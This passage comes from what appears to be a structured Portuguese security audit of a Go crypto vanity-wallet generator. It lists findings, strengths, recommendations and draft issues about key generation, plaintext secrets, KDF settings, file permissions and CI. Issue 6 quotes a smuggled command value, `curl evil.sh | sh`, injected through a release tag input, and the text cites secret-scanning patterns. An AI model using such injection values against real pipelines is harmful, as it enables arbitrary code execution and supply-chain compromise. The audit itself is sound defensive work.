            "actions do CI sem atualização (relacionado a F9)."
        ),
        "condicoes": "Sempre. Mitigado parcialmente por govulncheck, Trivy e Mend rodando no CI.",
    },
    {
        "id": "F13",
        "titulo": "Operações de keystore usam logger não sanitizado (fmt.Printf) em vez do SecureLogger",
        "severidade": "informativa",
        "categoria": "Observabilidade / defesa em profundidade",
        "arquivos": [
            "internal/crypto/keystore.go:1147-1170",
            "internal/crypto/keystore.go:1209",
            "internal/cli/commands.go:1889",
            "internal/cli/commands.go:1844",
        ],
        "trecho": (
            "internal/crypto/keystore.go:1147-1170\n"
            "    type DefaultProgressLogger struct {\n"
            "        VerboseMode bool\n"
            "    }\n"
            "    func (l *DefaultProgressLogger) LogError(message string) {\n"
            '        fmt.Printf("ERROR: %s\\n", message)\n'
            "    }\n\n"
            "internal/crypto/keystore.go:1209  (default do servico)\n"
            "    logger:      &DefaultProgressLogger{VerboseMode: false},\n\n"
            "internal/cli/commands.go:1889  (a CLI nunca injeta o SecureLogger)\n"
            "    keystoreService := crypto.NewKeyStoreService(keystoreConfig)\n"
            "    keystoreService.SetVerboseMode(verbose)"
        ),
        "porque": (
            "O projeto investe bastante em um logger seguro (`pkg/logging`, 1129 linhas, com allowlist "
            "de campos, redação por regex de chaves privadas/públicas/seed phrases e sanitização de "
            "caminhos). Existe `NewKeyStoreServiceWithLogger` para injeta-lo. Porém a CLI usa sempre "
            "`NewKeyStoreService`, que instala o `DefaultProgressLogger` - um `fmt.Printf` cru, sem "
            "nenhuma sanitização.\n\n"
            "Auditei todas as chamadas de log dentro de `keystore.go` e nenhuma delas passa senha, chave "
            "privada ou mnemônica: apenas caminhos, endereços e erros. Por isso o achado é informativo, "
            "não uma vulnerabilidade. O risco é de regressão: uma futura mensagem de depuração que "
            "interpole material sensível não encontrará nenhuma barreira de sanitização neste caminho, "
            "ao contrário do que a existência do `pkg/logging` sugere."
        ),
        "condicoes": "Sempre presente no caminho da CLI. Nenhum vazamento no código atual.",
    },
]

PONTOS_FORTES = [
    {
        "id": "PF1",
        "titulo": "Nenhum uso de gerador pseudoaleatório inseguro em todo o projeto",
        "evidencia": "Varredura por `math/rand` em todos os 79 arquivos .go: ZERO ocorrências, inclusive em "
        "testes. Todo material criptográfico vem de `crypto/rand`: `internal/crypto/ethereum.go:34`, "
        "`bitcoin.go:38`, `solana.go:32` (ed25519.GenerateKey(rand.Reader)), `keystore.go:657`, "
        "`chain.go:390`, `password.go:133 e 160`, `engine/cpu.go:268`.",
    },
    {
        "id": "PF2",
        "titulo": "Implementação do KeyStore V3 está criptograficamente correta",
        "evidencia": "AES-128-CTR com IV de 16 bytes aleatórios por keystore (keystore.go:996-999); chave de "
        "cifragem = derivedKey[0:16] e chave de MAC = derivedKey[16:32], conforme o padrão Ethereum "
        "(keystore.go:1052, 913-914); MAC Keccak256 sobre (macKey || ciphertext) (keystore.go:916-917); "
        "salt de 32 bytes aleatórios por keystore (keystore.go:988); e - ponto notável - "
        "`VerifyMAC` usa comparação em tempo constante implementada corretamente com OR de XORs "
        "(keystore.go:936-942), evitando oráculo por timing. Defaults de KDF fortes: scrypt "
        "N=262144/r=8/p=1/dklen=32 (kdf/scrypt.go:180-185) e PBKDF2 c=262144 (kdf/pbkdf2.go:190-192), "
        "ambos acima das recomendações correntes.",
    },
    {
        "id": "PF3",
        "titulo": "Logger seguro usa allowlist restritiva e redação por padrão, com fallback conservador",
        "evidencia": "`isSafeParameter` (pkg/logging/secure_logger.go:870-968) combina lista de bloqueio explícita "
        "(private_key, mnemonic, password, secret, token, seed, keystore...), verificação por "
        "substring de 10 padrões perigosos, lista de permissão explícita e - o mais importante - "
        "`return false` para chaves desconhecidas (linha 967): o padrão e NÃO registrar. "
        "`sanitizeError` (linhas 990-1018) redige por regex chaves privadas de 64 hex, chaves "
        "públicas de 128 hex, seed phrases de 12-24 palavras e senhas em URLs/parâmetros.",
    },
    {
        "id": "PF4",
        "titulo": "Escrita de arquivos é atômica, com permissão definida ANTES do conteúdo sensível",
        "evidencia": "`writeFileAtomic` (internal/crypto/keystore.go:1728-1828) segue a ordem correta: cria "
        "temporário no MESMO diretório (linha 1756, garantindo rename atômico no mesmo filesystem), "
        "aplica `Chmod(perm)` ANTES do primeiro `Write` (linha 1777-1780, fechando a janela em que o "
        "arquivo existiria com permissão frouxa), verifica a escrita completa (1789-1792), faz "
        "`Sync()` antes do rename (1795), reconfere as permissões do temporário (1811-1814) e do "
        "arquivo final (1825-1828), e remove o temporário em qualquer caminho de erro via defer "
        "(1765-1774). Todos os caminhos passam por `filepath.Join` + `filepath.Clean` e os nomes "
        "derivam de endereços já validados por `validateAddressForNetwork` - não há traversal.",
    },
    {
        "id": "PF5",
        "titulo": "Entrada do usuário é validada antes de qualquer uso",
        "evidencia": "`GenerationCriteria.Validate()` (pkg/wallet/types.go:141-177) impõe padrão <= 20 caracteres, valida hexadecimalidade de prefix e suffix, e rejeita a combinação `--case-sensitive` sem "
        "`--checksum`. `ValidateScryptParams` (keystore.go:209-253) exige N potência de 2 e limita o "
        "uso de memória a 2 GB, prevenindo exaustão de recursos. `config.Validate()` restringe "
        "thread count a 128, e valida por lista fechada KDF, nível de segurança, nível e formato de "
        "log e suporte a cor/unicode.",
    },
    {
        "id": "PF6",
        "titulo": "Nenhum segredo hardcoded no código, na configuração, no Docker, no CI ou no histórico Git",
        "evidencia": "Varredura por senhas, chaves de API, tokens, segredos de assinatura e blocos PEM em código "
        "Go, Dockerfile, Makefile, 5 workflows, .whitesource, dependabot.yml, README e docs/: as "
        'únicas ocorrências estão em arquivos `_test.go` (fixtures como "testpassword"). Não há '
        "padrões `${VAR:-default}` que virem segredo real. Varredura dos 75 commits do histórico "
        "(`git log --all -p`) por chaves de 64 hex, `ghp_`, `AKIA`, `xox`, `sk-` e por arquivos "
        "`.pwd`/`.key`/`.mnemonic`/`.env`/`.pem`: nada encontrado além de uma chave de teste em "
        "`internal/crypto/keystore_geth_compat_test.go:66`. O `.gitignore` já exclui `keystores/` e "
        "`*.log`. O CI usa exclusivamente `secrets.GITHUB_TOKEN` e `secrets.SEMGREP_APP_TOKEN` via "
        "referências, sem valores literais.",
    },
    {
        "id": "PF7",
        "titulo": "Engine Metal/GPU gera chaves independentes (contraste direto com F1)",
        "evidencia": "`generateEthereumPrivateKeyBatch` (internal/engine/metal_darwin_arm64.go:1088-1103) chama "
        "`generateEthereumPrivateKeyAttempt` por candidato, que lê `crypto/rand` por chave e valida "
        "o escalar contra a ordem de secp256k1 (engine/cpu.go:264-284). O buffer é zerado com "
        "`zeroBytes` em todos os caminhos de saída (linhas 874, 879, 1093, 1100, 1116). "
        "`validatePrivateKeyBatch` (linha 1255-1262) reconfere cada chave do lote antes de enviar a "
        "GPU. Este é o comportamento correto que o caminho CPU deveria ter.",
    },
    {
        "id": "PF8",
        "titulo": "Geração de senha usa amostragem por rejeição correta, sem vies de módulo",
        "evidencia": "`setRandomCharFromSet` (internal/crypto/password.go:139-150) calcula "
        "`maxValid := 256 - (256 % len(charset))` e re-sorteia enquanto o byte estiver fora da "
        "faixa - implementação textualmente correta de rejection sampling. O embaralhamento final "
        "usa Fisher-Yates com a mesma técnica (linhas 155-180). Senha de 12 caracteres sobre um "
        "alfabeto de 88 simbolos com garantia de uma ocorrência de cada classe (~77 bits de "
        "entropia).",
    },
    {
        "id": "PF9",
        "titulo": "Container e pipeline de CI seguem boas práticas de base",
        "evidencia": "Dockerfile multi-stage com `CGO_ENABLED=0`, usuário não-root dedicado uid/gid 1001 "
        "(linhas 60-61) e `USER bloco-vgen` antes do ENTRYPOINT (linha 78); `go mod verify` na "
        "build (linha 26); `.dockerignore` exclui `.git`, `.env*`, `*.log` e `testdata/`. O CI "
        "declara `permissions: contents: read` no nível do workflow (ci.yaml:13-15) e já executa "
        "quatro camadas de análise de segurança: gosec, govulncheck, Semgrep e Trivy.",
    },
    {
        "id": "PF10",
        "titulo": "Higiene de memória para material sensível está presente e é aplicada",
        "evidencia": "`CryptoPool.PutPrivateKeyBuffer` (internal/crypto/pools.go:116-124) zera o buffer antes de "
        "devolve-lo ao pool, e `DefaultPoolConfig()` (linha 281-287) habilita `EnableClearing: true` "
        "por padrão - o caminho efetivamente usado pela CLI (commands.go:159). "
        "`MemoryCleaner` (crypto/random.go:196-253) e `zeroBytes` (engine/cpu.go:286-291, com "
        "`runtime.KeepAlive` para impedir a eliminação pelo compilador) cobrem os demais caminhos.",
    },
]

RECOMENDACOES = [
    {
        "prioridade": "P1",
        "titulo": "Restaurar a independência das chaves privadas geradas na engine CPU",
        "achados": "F1",
        "detalhe": "Reduzir drasticamente `ChainBatchSize` não resolve; a correção e desacoplar a busca da "
        "entrega. Opção recomendada: manter a cadeia apenas como filtro rapido de candidatos e, ao "
        "encontrar um endereço que casa com o padrão, descartar o escalar da cadeia e re-sortear "
        "uma chave independente - inviável, pois o endereço depende da chave. Opção prática: usar a "
        "cadeia somente para a varredura e, ao encontrar match, reiniciar a cadeia com novo seed "
        "para a proxima carteira (`p.chains[workerID] = nil` após cada resultado), o que limita a "
        "relação a chaves nunca entregues ao usuário. Solução completa: gerar cada chave entregue "
        "de forma independente com `crypto/rand`, aceitando o custo, ou adotar o offset secreto "
        "aleatório por chave. Enquanto não houver correção, documentar o comportamento no README e "
        "avisar no stdout ao usar `--count > 1`.",
    },
    {
        "prioridade": "P1",
        "titulo": "Parar de gravar segredos em claro ao lado dos artefatos cifrados",
        "achados": "F2, F3",
        "detalhe": "Ethereum: solicitar a senha ao usuário (`golang.org/x/term`, já no go.mod) ou, se a senha "
        "for gerada, exibi-la uma única vez no terminal e gravar o `.pwd` apenas mediante flag "
        "explícita `--write-password-file`, com aviso claro. Solana: gravar o keystore V3 "
        "efetivamente cifrado no `.json` (hoje ele só contém metadados) e tornar o `.key` em claro "
        "opcional via flag. Em qualquer caso, corrigir o campo `note` do JSON de Solana "
        "(keystore.go:1576), que hoje afirma falsamente que a chave está cifrada.",
    },
    {
        "prioridade": "P1",
        "titulo": "Garantir que o backup de Bitcoin recupere a carteira gerada",
        "achados": "F4",
        "detalhe": "Derivar a chave privada A PARTIR da mnemônica (BIP-39 -> BIP-32 -> caminho BIP-44 "
        "m/44'/0'/0'/0/0) em vez de sortear as duas de forma independente, tornando o arquivo "
        "`.mnemonic` um backup real. Alternativamente, persistir também a chave privada em keystore "
        "cifrado. Até a correção, a CLI deve recusar-se a gerar carteira Bitcoin sem `--i-understand` "
        "ou, no mínimo, imprimir um aviso destacado de que o arquivo salvo NÃO restaura a carteira.",
    },
    {
        "prioridade": "P2",
        "titulo": "Ligar os parâmetros de KDF configurados a camada que cifra, ou remover as flags",
        "achados": "F5",
        "detalhe": "Fazer `EncryptPrivateKeyWithKDF` usar `ks.config.KDFParams` quando preenchido, caindo para "
        "`GetDefaultParams` apenas quando vazio. ATENÇÃO a ordem: corrigir ANTES o piso do validador "
        "de scrypt (commands.go:1351-1361) para exigir N >= 262144 (ou custo de memória mínimo "
        "equivalente), espelhando o piso já existente para PBKDF2. Ligar os parâmetros sem corrigir "
        "o validador transformaria um achado benigno em geração de keystores fracos.",
    },
    {
        "prioridade": "P2",
        "titulo": "Uniformizar as permissões de arquivo e diretório dos artefatos sensíveis",
        "achados": "F6, F7, F8",
        "detalhe": "Trocar 0644 por 0600 nas duas aberturas de log (secure_logger.go:623 e 758). Trocar 0755 "
        "por 0700 nos dois `MkdirAll` do keystore (keystore.go:1713 e 1745). Fazer "
        "`CheckDirectoryPermissions` verificar de fato o modo do diretório e recusar (ou alertar) "
        "quando houver bits de grupo/outros. Ligar `KeyStore.FileMode` as escritas ou remover o "
        "campo; se ligado, restringir a validação a 0600/0400 em vez de aceitar até 0777.",
    },
    {
        "prioridade": "P2",
        "titulo": "Corrigir a injeção de script e pinar as actions do CI",
        "achados": "F9, F12",
        "detalhe": "Em release.yaml, mover `github.event.inputs.tag` para um bloco `env:` e referência-lo como "
        '"$TAG" no script - o padrão já aplicado corretamente em version-bump.yml:130-136. Validar '
        "o formato do tag com regex antes de usar. Pinar `aquasecurity/trivy-action` por SHA de "
        'commit ou tag imutável. Preencher `package-ecosystem: "gomod"` no dependabot.yml e '
        "adicionar uma segunda entrada `github-actions` para manter as próprias actions atualizadas.",
    },
    {
        "prioridade": "P3",
        "titulo": "Implementar ou remover as flags inertes e validar --network no parsing",
        "achados": "F10, F11",
        "detalhe": "Implementar `--output`/`--format` no caminho de geração (gravando com 0600, como o "
        "benchmark já faz em benchmark.go:983) ou remove-las do comando raiz para não induzir o "
        "usuário a acreditar que o material sensível não passou pelo terminal. Adicionar validação "
        "de `Network` por lista fechada em `GenerationCriteria.Validate()` "
        "(pkg/wallet/types.go:141), falhando cedo em vez de cair no `default` do gerador Ethereum.",
    },
    {
        "prioridade": "P3",
        "titulo": "Injetar o SecureLogger no serviço de keystore",
        "achados": "F13",
        "detalhe": "Usar `crypto.NewKeyStoreServiceWithLogger` na CLI (commands.go:1889 e 1844) com um adaptador "
        "sobre `logging.SecureLogger`, de modo que toda mensagem produzida em `keystore.go` passe "
        "pela sanitização. Barreira de defesa em profundidade contra regressões futuras.",
    },
]

ISSUES = [
    {
        "n": 1,
        "titulo": "[Segurança] Chaves privadas Ethereum são geradas em cadeia linear e não são independentes entre si",
        "labels": "security, severity:alta, criptografia",
        "problema": "No caminho padrão de geração Ethereum (engine CPU), cada worker sorteia um único seed "
        "aleatório `k0` e deriva as 4095 chaves seguintes como `k0+1`, `k0+2`, ... A chave privada "
        "entregue ao usuário é exatamente esse escalar. Como `Pool.chains` reutiliza a mesma cadeia "
        "entre chamadas de `GenerateWalletWithContext`, todas as carteiras produzidas por "
        "`--count N` costumam sair do mesmo lote de 4096 e são mutuamente deriváveis.\n\n"
        "Por que é explorável: um atacante que obtenha UMA chave privada do lote recupera todas as "
        "demais testando `k +/- i` para `i` em 1..4095 - 8190 candidatos, verificáveis em "
        "milissegundos. Isso quebra o padrão de uso mais comum da ferramenta, que é gerar várias "
        "carteiras de uma vez e trata-las como compartimentadas.",
        "evidencia": "`internal/crypto/chain.go:18`\n"
        "```go\nconst ChainBatchSize = 4096\n```\n\n"
        "`internal/crypto/chain.go:409-412`\n"
        "```go\nbatch.points[0].Set(&start)\n"
        "for i := 1; i < ChainBatchSize; i++ {\n"
        "    secp256k1.AddNonConst(&batch.points[i-1], &chainGeneratorPoint, &batch.points[i])\n}\n```\n\n"
        "`internal/crypto/chain.go:466-470`\n"
        "```go\nvar kScalar, offsetScalar secp256k1.ModNScalar\n"
        "kScalar.SetByteSlice(batch.k0[:])\n"
        "offsetScalar.SetInt(uint32(offset))\n"
        "kScalar.Add(&offsetScalar) // k0 + pos\n"
        "kScalar.PutBytesUnchecked(key[:])\n```\n\n"
        "`internal/worker/pool.go:372-374` e `413-417` - a chave da cadeia é a chave entregue:\n"
        "```go\nkeyBytes, pub, err = chain.NextKey()\n...\n"
        "privateKey.D = new(big.Int).SetBytes(keyBytes[:])\n```\n\n"
        "Verificação empírica (teste ad hoc sobre `crypto.NewPrivateKeyChain()`): a diferença entre "
        "chaves consecutivas foi exatamente `1` em 9/9 medições.\n\n"
        'O comentário em `chain.go:331-332` já alerta que a cadeia "must not be used as a source of '
        'independent random keys outside vanity generation" - mas `pool.go` entrega essas chaves '
        "como carteiras finais do usuário.",
        "impacto": "Comprometimento de uma única carteira gerada compromete todas as outras da mesma execução. "
        "Usuários que geram uma carteira quente e uma fria no mesmo comando, ou uma carteira por "
        "cliente, não possuem o isolamento que acreditam ter. O comportamento não está documentado "
        "no README, inclusive na seção 'Current limitations'.",
        "correcao": "Desacoplar a varredura da entrega. Mínimo: após cada carteira encontrada, descartar a "
        "cadeia do worker (`p.chains[workerID] = nil`) para que nenhuma chave entregue compartilhe "
        "lote com outra entregue. Ideal: gerar cada chave entregue de forma independente com "
        "`crypto/rand`. Enquanto não corrigido, documentar no README e avisar no stdout quando "
        "`--count > 1`.\n\n"
        "Não afeta a engine Metal (`internal/engine/metal_darwin_arm64.go:1088-1103`), que já gera "
        "chaves independentes e serve de referência.",
        "criterios": [
            "Duas carteiras retornadas na mesma execução nunca tem chaves privadas cuja diferença seja menor que 2^128",
            "Existe teste automatizado que gera N>=10 carteiras via `Pool.GenerateWalletWithContext` e falha se qualquer par tiver diferença < 2^128",
            "O comentário de `chain.go:323-325` deixa de afirmar 'uniformly random' se a propriedade não valer dentro do lote",
            "README documenta a propriedade de independência das chaves entregues",
            "`go test ./...` passa",
        ],
    },
    {
        "n": 2,
        "titulo": "[Segurança] Segredos gravados em texto claro ao lado dos artefatos cifrados (senha do keystore e chave Solana)",
        "labels": "security, severity:alta, keystore",
        "problema": "Dois fluxos gravam material secreto sem qualquer criptografia no mesmo diretório dos "
        "artefatos que deveriam proteger:\n\n"
        "1. **Ethereum**: a senha que abre o keystore V3 é gravada em texto puro em "
        "`0x<endereco>.pwd`, no mesmo diretório e no mesmo instante do keystore. Todo o custo do "
        "scrypt N=262144 é anulado - o par keystore+senha equivale a chave privada em claro.\n\n"
        "2. **Solana**: a única cópia utilizável da chave é `<endereco>.key`, com os 64 bytes da "
        "chave Ed25519 em hexadecimal puro, sem KDF, cifra ou MAC. O keystore V3 é gerado em memória "
        "mas nunca chega ao disco; `saveSolanaKeypair` grava apenas metadados - e o campo `note` "
        'desse JSON afirma falsamente que "private key is encrypted in KeyStore V3 format".\n\n'
        "Por que é explorável: qualquer cópia do diretório `./keystores` - backup em nuvem, "
        "snapshot, `tar` enviado ao suporte, sincronização Dropbox/iCloud, malware que exfiltra a "
        "pasta - leva junto o segredo em claro. O modo 0600 protege contra outros usuários locais, "
        "não contra esse vetor.",
        "evidencia": "`internal/crypto/keystore.go:1494-1495` e `1523-1525`\n"
        "```go\npasswordPath := filepath.Join(ks.config.OutputDirectory,\n"
        '    fmt.Sprintf("%s.pwd", formattedAddress))\n...\n'
        "if err := ks.writeFileAtomic(passwordPath, []byte(password), 0600); err != nil {\n```\n\n"
        "`internal/crypto/keystore.go:1467-1473`\n"
        '```go\ncase "solana":\n'
        "    if err := ks.saveSolanaKeypair(address, keystore); err != nil { return err }\n"
        "    // Also save private key to .key file for easy access (unencrypted)\n"
        "    return ks.SavePrivateKeyFile(address, privateKeyHex, network)\n```\n\n"
        "`internal/crypto/keystore.go:1571-1577` - o JSON afirma proteção que não existe:\n"
        "```go\nsolanaKeypair := map[string]interface{}{\n"
        '    "type":    "solana-keypair",\n'
        '    "address": address,\n'
        '    "note":    "Solana keypair - private key is encrypted in KeyStore V3 format",\n}\n```\n\n'
        "`internal/crypto/keystore.go:1674-1678`\n"
        "```go\nkeyPath := filepath.Join(ks.config.OutputDirectory,\n"
        '    fmt.Sprintf("%s.key", formattedAddress))\n'
        "if err := ks.writeFileAtomic(keyPath, []byte(privateKeyHex), 0600); err != nil {\n```",
        "impacto": "Perda total de fundos das carteiras geradas caso o diretório de keystores seja copiado, "
        "sincronizado ou exfiltrado. A criptografia do keystore V3, corretamente implementada, não "
        "oferece nenhuma proteção efetiva no layout atual em disco.",
        "correcao": "- Ethereum: solicitar a senha ao usuário via `golang.org/x/term` (já presente no go.mod) ou, "
        "se gerada, exibi-la uma única vez e gravar o `.pwd` apenas com flag explícita "
        "`--write-password-file`, acompanhada de aviso.\n"
        "- Solana: gravar o keystore V3 realmente cifrado no `.json` e tornar o `.key` em claro "
        "opcional via flag.\n"
        "- Corrigir o campo `note` em `keystore.go:1576` para descrever o que de fato foi gravado.",
        "criterios": [
            "Executar `bloco-vgen --prefix ab` não produz arquivo `.pwd` sem flag explícita",
            "Executar `bloco-vgen --network solana --prefix ab` não produz `.key` em claro sem flag explícita",
            "O `<endereco>.json` de Solana contém um keystore V3 válido, decifrável com a senha correta",
            "Nenhum artefato gravado afirma que a chave está cifrada quando ela não está",
            "README atualizado nas linhas sobre artefatos por rede",
            "`go test ./...` passa",
        ],
    },
    {
        "n": 3,
        "titulo": "[Segurança] Backup de Bitcoin salva mnemônica que não deriva a chave gerada, tornando a carteira irrecuperável",
        "labels": "security, severity:alta, bitcoin, perda-de-dados",
        "problema": "`BitcoinGenerator.GenerateWallet` sorteia 32 bytes aleatórios como chave privada e, "
        "separadamente, sorteia 128 bits de entropia para uma mnemônica BIP-39 sem nenhuma relação matemática com essa chave. O fluxo de persistência de Bitcoin grava EXCLUSIVAMENTE a "
        "mnemônica e recusa gravar keystore. O único artefato em disco é um backup que não restaura "
        "a carteira.\n\n"
        "Por que é explorável (perda irreversível): a chave privada real é impressa apenas no stdout. "
        "No modo TUI padrão, com `--quiet` e `--count > 1`, ou simplesmente ao fechar o terminal, "
        "ela é perdida de forma definitiva - possivelmente com fundos já enviados ao endereço vanity. "
        'A CLI ainda imprime "Mnemonic: Saved", reforçando a impressão de que o backup é válido.',
        "evidencia": "`internal/crypto/bitcoin.go:37-63`\n"
        "```go\n// Generate 32 random bytes for private key\n_, err := rand.Read(privateKey)\n...\n"
        "// Generate BIP-39 mnemonic for backup\n"
        "// Note: This mnemonic is for backup purposes only and is not used to derive the key\n"
        "// The actual private key is randomly generated above\n"
        "mnemonic, err := generateBIP39Mnemonic()\n```\n\n"
        "`internal/cli/commands.go:1833-1848` - só a mnemônica é persistida:\n"
        '```go\nif strings.ToLower(w.Network) == "bitcoin" {\n'
        "    ...\n    // Save only the mnemonic for Bitcoin\n"
        "    if err := keystoreService.SaveMnemonicFile(w.Address, w.Mnemonic, w.Network); err != nil {\n```\n\n"
        "`internal/crypto/keystore.go:1464-1466` - keystore explicitamente recusado:\n"
        '```go\ncase "bitcoin":\n'
        "    // Bitcoin only saves mnemonic, no KeyStore V3\n"
        '    return fmt.Errorf("bitcoin keystore saving should use SaveMnemonicFile directly")\n```\n\n'
        "`internal/cli/commands.go:1751-1753` - a CLI afirma que o backup foi salvo:\n"
        '```go\nif result.Wallet.Mnemonic != "" {\n    fmt.Printf("  Mnemonic: Saved\\n")\n}\n```',
        "impacto": "Perda permanente e irreversível de fundos. O arquivo `.mnemonic` passa em qualquer inspeção "
        "superficial (e uma mnemônica BIP-39 válida), de modo que o usuário só descobre o problema "
        "ao tentar restaurar - quando a chave já não existe em lugar algum.",
        "correcao": "Derivar a chave privada A PARTIR da mnemônica (BIP-39 -> BIP-32 -> BIP-44 m/44'/0'/0'/0/0), "
        "tornando o `.mnemonic` um backup real; `github.com/tyler-smith/go-bip32` e `go-bip39` já "
        "estão no go.mod. Alternativa: persistir a chave privada em keystore cifrado. Até la, "
        "imprimir aviso destacado de que o arquivo salvo NÃO restaura a carteira.",
        "criterios": [
            "A mnemônica gravada em `<endereco>.mnemonic` restaura exatamente o endereço e a chave privada gerados",
            "Existe teste que gera carteira Bitcoin, deriva a chave a partir da mnemônica salva e compara endereço e chave",
            "Se a derivação não for implementada, a CLI exibe aviso explícito e o README para de descrever o arquivo como backup",
            "Linhas 149 e 248 do README refletem o comportamento final",
            "`go test ./...` passa",
        ],
    },
    {
        "n": 4,
        "titulo": "[Segurança] Controles de KDF e de permissão configurados nunca são aplicados (--security-level, --kdf-params, file_mode)",
        "labels": "security, severity:media, configuração",
        "problema": "Três controles de segurança são declarados, validados e nunca aplicados:\n\n"
        "1. `--security-level` e `--kdf-params`: a CLI calcula os parâmetros de KDF e os coloca em "
        "`KeyStoreConfig.KDFParams`, mas `EncryptPrivateKeyWithKDF` sempre chama "
        "`GetDefaultParams(kdfType)` e ignora o campo. Rastreadas as 13 ocorrências de `KDFParams` "
        "em `keystore.go`: nenhuma lê o config. Quem executa `--security-level very-high` recebe "
        "silenciosamente parâmetros de nível médio.\n\n"
        "2. `KeyStore.FileMode`: existe, tem default 0600, é validado e é serializável em YAML, mas "
        "nenhuma linha do projeto o lê - as escritas usam o literal 0600. Pior: a validação aceita "
        "até 0777.\n\n"
        "3. Assimetria no validador: o caminho scrypt aceita N=1024 com r=1/p=1 (~128 KB, trivial de "
        "forçar bruta), enquanto o caminho PBKDF2 impõe corretamente c >= 100000.\n\n"
        "Hoje o conjunto falha de forma SEGURA (os defaults do handler são fortes: scrypt N=262144). "
        "O risco é o desalinhamento entre política declarada e aplicada e, principalmente, a "
        "regressão: ligar `KDFParams` sem antes corrigir o piso do validador passaria a gerar "
        "keystores fracos.",
        "evidencia": "`internal/cli/commands.go:1868-1877` - a CLI calcula os parâmetros:\n"
        "```go\nkdfParams := app.config.KeyStore.KDFParams\n"
        "if len(kdfParams) == 0 {\n"
        "    securityLevel := app.parseSecurityLevel(app.config.KeyStore.SecurityLevel)\n"
        "    defaultParams, err := analyzer.GetOptimizedParams(\n"
        "        app.config.KeyStore.KDFAlgorithm, securityLevel, 512)\n"
        "    kdfParams = defaultParams\n}\n```\n\n"
        "`internal/crypto/keystore.go:1003-1004` - a cifragem os descarta:\n"
        "```go\n// Get default parameters for the specified KDF\n"
        "defaultParams, err := ks.kdfService.GetDefaultParams(kdfType)\n```\n\n"
        "`internal/cli/commands.go:1355-1358` - piso fraco para scrypt:\n"
        "```go\nif nInt < 1024 || nInt > 67108864 {\n"
        '    return fmt.Errorf("n parameter must be between 1024 and 67108864, got %d", nInt)\n}\n```\n'
        "contra `internal/cli/commands.go:1409-1411` - piso correto para PBKDF2:\n"
        "```go\nif cInt < 100000 {\n"
        '    return fmt.Errorf("c parameter (iteration count) must be at least 100000 for security, got %d", cInt)\n}\n```\n\n'
        "`internal/config/config.go:63, 115, 278-280` - FileMode declarado, validado até 0777, nunca aplicado.",
        "impacto": "Operadores não conseguem endurecer a criptografia do keystore nem as permissões dos "
        "arquivos, sem receber qualquer aviso de que a configuração foi ignorada. Se `KDFParams` for "
        "ligado sem corrigir o validador de scrypt, keystores com N=1024 passam a ser aceitos e "
        "gerados - quebra prática da proteção por senha.",
        "correcao": "ORDEM IMPORTA. Primeiro elevar o piso de scrypt em `validateScryptParams` "
        "(commands.go:1351-1361) para N >= 262144 ou custo de memória mínimo equivalente, espelhando "
        "o piso do PBKDF2. Somente depois fazer `EncryptPrivateKeyWithKDF` usar "
        "`ks.config.KDFParams` quando preenchido, caindo para `GetDefaultParams` quando vazio. "
        "Para `FileMode`: ligar as escritas e restringir a validação a 0600/0400, ou remover o campo.",
        "criterios": [
            '`--kdf-params \'{"n":1048576,"r":8,"p":1,"dklen":32}\'` produz keystore cujo `crypto.kdfparams.n` e 1048576',
            "`--security-level very-high` produz parâmetros distintos de `--security-level low`, verificável no JSON gerado",
            "`--kdf-params` com N abaixo do piso é rejeitado com mensagem clara antes de qualquer geração",
            "`KeyStore.FileMode` afeta a permissão real dos arquivos gravados, ou o campo foi removido",
            "A validação de `file_mode` não aceita mais 0777",
            "Existem testes cobrindo os três pontos; `go test ./...` passa",
        ],
    },
    {
        "n": 5,
        "titulo": "[Segurança] Permissões frouxas em logs (0644) e no diretório de keystores (0755), e verificação de permissão que não verifica nada",
        "labels": "security, severity:media, permissões",
        "problema": "Todo o projeto grava artefatos sensíveis com 0600, com exceções:\n\n"
        "1. Arquivos de log criados com 0644 (legíveis por qualquer usuário local), tanto na abertura "
        "inicial quanto após cada rotação. O logger é efetivamente seguro quanto a chaves privadas, "
        "mas registra `address` como campo permitido - expondo a terceiros locais quais endereços "
        "vanity o usuário gerou, quando e com que padrão.\n\n"
        "2. O diretório que guarda keystores, senhas e chaves é criado com 0755 em dois pontos: "
        "qualquer usuário local pode entrar e listar. Os nomes dos arquivos SÃO os endereços.\n\n"
        "3. `CheckDirectoryPermissions` não verifica permissão alguma - apenas confirma que o "
        "diretório existe e aceita escrita. Um `--keystore-dir` apontando para um diretório "
        "pré-existente com modo 0777 é aprovado sem alerta, apesar do nome da função.",
        "evidencia": "`pkg/logging/secure_logger.go:623` e `758`\n"
        "```go\nfile, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)\n"
        "...\nfile, err := os.OpenFile(l.config.OutputFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)\n```\n\n"
        "`internal/crypto/keystore.go:1713` e `1745`\n"
        "```go\nif err := os.MkdirAll(cleanPath, 0755); err != nil {\n"
        "...\nif err := os.MkdirAll(dir, 0755); err != nil {\n```\n\n"
        "`internal/crypto/keystore.go:1885-1890` - a única 'verificação' feita:\n"
        "```go\n// Check if directory is writable by attempting to create a temp file\n"
        'tmpFile, err := os.CreateTemp(ks.config.OutputDirectory, ".permission-test-*")\n```',
        "impacto": "Em host multiusuário, container com volume compartilhado ou runner de CI, outros usuários "
        "locais enumeram os endereços gerados e leem os logs operacionais. O conteúdo dos segredos "
        "permanece protegido pelos arquivos 0600, mas o metadado vaza e a função que deveria alertar "
        "sobre diretórios inseguros aprova qualquer coisa gravável.",
        "correcao": "Trocar 0644 por 0600 em `secure_logger.go:623` e `758`. Trocar 0755 por 0700 em "
        "`keystore.go:1713` e `1745`. Fazer `CheckDirectoryPermissions` inspecionar "
        "`info.Mode().Perm()` e recusar (ou alertar com destaque) quando houver bits de grupo ou "
        "outros no diretório de saída.",
        "criterios": [
            "Arquivo de log criado por `--log-file` tem modo 0600",
            "Arquivo de log criado após rotação tem modo 0600",
            "Diretório `./keystores` criado pela ferramenta tem modo 0700",
            "`CheckDirectoryPermissions` retorna erro ou alerta para diretório de saída com modo 0777",
            "Existem testes cobrindo os quatro pontos; `go test ./...` passa",
        ],
    },
    {
        "n": 6,
        "titulo": "[Segurança] Injeção de script no workflow de release e action de terceiro não pinada",
        "labels": "security, severity:media, ci-cd",
        "problema": "1. **Injeção de script**: em `release.yaml`, `${{ github.event.inputs.tag }}` é expandido "
        "pelo runner ANTES da execução do shell, diretamente dentro do corpo do `run:`. Um valor "
        'como `v1.0.0"; curl evil.sh | sh; echo "` executa comandos arbitrarios num job que detem '
        "`contents: write`, `packages: write` e `id-token: write` - permitindo publicar releases e "
